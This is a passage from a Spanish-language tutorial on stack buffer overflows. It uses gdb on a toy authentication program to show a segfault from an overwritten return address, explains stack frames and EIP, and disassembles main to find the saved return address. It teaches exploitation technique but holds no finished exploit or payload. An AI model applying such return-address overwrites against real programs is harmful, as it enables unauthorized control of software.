&lt;p&gt;&lt;em&gt;auth_flag&lt;/em&gt; está almacenada en la dirección 0xbffff7dc y su valor está entre paréntesis, &lt;em&gt;password_buffer&lt;/em&gt; comienza inmediatamente despues en 0xbffff7e0.&lt;/p&gt;

&lt;p&gt;Si terminamos la ejecución del programa nos encontraremos con esto:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;No hemos sobrescrito &lt;em&gt;auth_flag&lt;/em&gt;, en su lugar hemos sobrescrito un punto crítico del programa que obliga a finalizar su ejecución inesperadamente.&lt;/p&gt;

&lt;p&gt;Para entender lo que ha pasado es necesaria una breve explicación de cómo se forman los ejecutables. Durante la ejecución de un programa existe una estructura de datos llamada pila (o stack) que se usa para para mantener el flujo de ejecución de un programa y el contexto de las variables locales durante las llamadas a funciones. Cuando se realiza una llamada a una función, una estructura llamada cuadro de pila (stack frame) se introduce en la pila, y el registro EIP (Registro que apunta a la intrucción actual a ejecutar) salta a la primera línea de la función. Cuando ésta acaba, el registro EIP debe volver a apuntar a la siguiente instrucción despues de la llamada a la función, la dirección de dicha instrucción se guarda en el cuadro de pila de la función. En nuestro caso, cuando estamos en la función &lt;em&gt;check_authtentication&lt;/em&gt; se guarda la dirección de retorno a la que apuntará EIP cuando finalize y vuelva al main. El error de segmentación que hemos obtenido a sido al sobreescribir dicha dirección de retorono al desbordar el buffer, con lo cual el programa salta a una dirección aleatoria y finaliza ya que se sale de su segmento.&lt;/p&gt;

&lt;p&gt;Si echamos un vistazo código ensamblador de la función main podemos averiguar cual es la dirección que debe guardarse en el cuadro de pila de &lt;em&gt;check_authtentication&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;gdb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;disass&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;
&lt;span class=&#34;nf&#34;&gt;Dump&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;assembler&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048474&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;push&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048475&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048477&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;sub&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x8&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804847a&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;and&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0xfffffff0&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804847d&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x0&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048482&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;sub&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048484&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;cmp&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x1&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048488&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;jg&lt;/span&gt;     &lt;span class=&#34;mh&#34;&gt;0x80484ab&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804848a&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804848d&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804848f&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048493&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x80485e5&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804849a&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804849f&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x0&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484a6&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804833c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484ab&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484ae&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;add&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x4&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484b1&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484b3&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484b6&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x8048414&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bb&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;test&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bd&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;je&lt;/span&gt;     &lt;span class=&#34;mh&#34;&gt;0x80484e5&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484bf&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x80485fb&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484c6&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484cb&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x8048619&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484d2&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484d7&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x8048630&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484de&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484e3&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;jmp&lt;/span&gt;    &lt;span class=&#34;mh&#34;&gt;0x80484f1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484e5&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x804864d&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484ec&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484f1&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;leave&lt;/span&gt;
&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484f2&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;ret&lt;/span&gt;
&lt;span class=&#34;nf&#34;&gt;End&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;assembler&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;dump.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code&gt;0x080484b6 &amp;lt;main&amp;gt;: call 0x8048414 &amp;lt;check_authentication&amp;gt;&lt;/code&gt; es la llamada a la función, y está ubicada en 0x080484b6. Antes de hacer la llamada se crea el marco de pila y se guarda la dirección de retorno en la pila, la cual es 0x080484bb.&lt;/p&gt;

&lt;p&gt;Volvamos a examinar el programa:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;gdb -q auth_overflow2.c.binary
